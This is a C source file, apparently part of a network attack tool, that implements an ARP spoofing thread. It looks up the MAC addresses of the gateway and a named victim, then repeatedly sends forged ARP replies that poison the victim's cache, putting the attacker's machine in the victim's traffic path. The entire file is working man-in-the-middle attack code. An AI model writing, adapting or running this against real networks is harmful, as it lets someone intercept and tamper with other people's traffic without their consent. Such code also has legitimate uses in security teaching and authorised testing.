#include "core.h"

void* start_arp_spoof_script(void* arp_spoof_script_args) {
    int arp_sock = get_arp_socket();
    ARPSpoofScriptArgs* args = (ARPSpoofScriptArgs*)arp_spoof_script_args;
    Mac attacker_mac = get_interface_mac(args->if_name);
    u32 gateway_addr_hl = get_gateway_addr_hl(args->if_name);
    u32 victim_addr_hl = inet_addr(args->victim_addr_str);

    Mac gateway_mac = {0};
    if (request_target_mac(
            arp_sock, args->if_name, &gateway_mac, gateway_addr_hl, 1, 10
        )
        == 0) {
        printf("ERROR: Can't obtain gateway mac\n");
        close(arp_sock);
        exit(1);
    }

    Mac victim_mac = {0};
    if (request_target_mac(
            arp_sock, args->if_name, &victim_mac, victim_addr_hl, 1, 10
        )
        == 0) {
        printf("ERROR: Can't obtain victim mac\n");
        close(arp_sock);
        exit(1);
    }

    printf("INFO: ARP spoof started on victim:\n    MAC: ");
    print_mac(victim_mac);
    printf("\n    IP:  ");
    print_addr_l(victim_addr_hl);
    printf("\n");

    args->is_terminated = 0;
    time_t start_time = 0;
    int elapsed_time;
    do {
        time_t current_time = time(NULL);
        elapsed_time = current_time - start_time;
        if (elapsed_time >= args->spoof_period_sec) {
            send_arp_spoof(
                arp_sock,
                args->if_name,
                attacker_mac,
                gateway_addr_hl,
                victim_mac,
                victim_addr_hl
            );
            start_time = time(NULL);
        }
    } while (args->is_terminated == 0);

    close(arp_sock);
}
